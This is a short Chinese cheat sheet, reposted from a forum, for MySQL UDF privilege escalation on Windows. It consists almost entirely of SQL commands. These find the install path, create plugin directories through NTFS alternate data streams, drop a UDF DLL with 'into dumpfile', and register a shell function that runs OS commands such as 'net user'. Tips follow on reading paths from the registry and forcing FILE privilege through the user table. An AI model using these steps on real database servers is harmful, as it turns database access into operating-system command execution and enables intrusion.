# UDF手工提权辅助

> 原文：[https://www.zhihuifly.com/t/topic/3527](https://www.zhihuifly.com/t/topic/3527)

# UDF 手工提权辅助：

```
select @@basedir;  #查看mysql安装目录
select 'It is dll' into dumpfile 'C:\。。lib::';  #利用NTFS ADS创建lib目录
select 'It is dll' into dumpfile 'C:\。。lib\plugin::';  #利用NTFS ADS创建plugin目录
select 0xUDFcode into dumpfile 'C:\phpstu\MySQL\lib\plugin\mstlab.dll';  #导出udfcode，注意修改udfcode
create function cmdshell returns string soname 'mstlab.dll';   #用udf创建cmd函数，shell,sys_exec,sys_eval
select shell('cmd','net user');     #执行cmd命令
show variables like '%plugin%';     #查看plugin路径 
```

## 小技巧：

```
1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中ImagePath的值为mysql安装目录
2.my.ini中datadir的值是数据存放目录
3.UPDATE user set File_priv ='Y';  flush privileges; 强制加file权限 
```